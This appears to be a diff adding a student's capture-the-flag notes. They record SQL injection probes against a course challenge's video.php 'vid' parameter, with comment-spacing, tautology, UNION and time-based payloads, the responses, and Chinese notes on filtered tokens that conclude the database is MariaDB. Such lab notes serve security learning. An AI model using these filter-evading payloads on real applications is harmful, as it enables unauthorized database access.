@@ -1,0 +1,40 @@
+https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/IF(1,SLEEP(5),1)=1#
+> Error
+
+https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/IF(1,SLEEP(5),1)=1--
+> Error
+
+https://edu-ctf.csie.org:10159/video.php?vid=-1/**/UNION/**/SELECT/**/1,2,3,4--
+> Error
+
+https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/AND/**/1=1
+> 第 7 個影片
+
+https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/AND/**/1=1/**/LIMIT/**/1,1#
+> Error
+
+
+https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/OR/**/1=1
+> 第 1 個影片
+
+https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/OR/**/1=1#
+> 同上
+
+https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/OR/**/1=1
+> 同上
+
+https://edu-ctf.csie.org:10159/video.php?vid=8-1/**/AND/**/IF(2=1,SLEEP(5),1)=1/**/LIMIT/**/1,1#
+> ERROR
+
+不能用 LIMIT, ', IF, SLEEP, ||, +, 
+
+可以用 OR, AND, -, *, /, 
+
+#, --, /**/ 都是註解
+『MySQL』, 『PostgreSQL』,『Microsoft SQL Server』,『Oracle Database』
+不是 MySQL : mySQL 的 -- 不是註解
+不是 PostgreSQL : postgreSQL 的 # 不是註解
+不是 Microsoft SQL : Microsoft SQL 的 # 不是註解
+不是 Oracle Database : Oracle Database 的 # 不是註解
+
+是 MariaDB
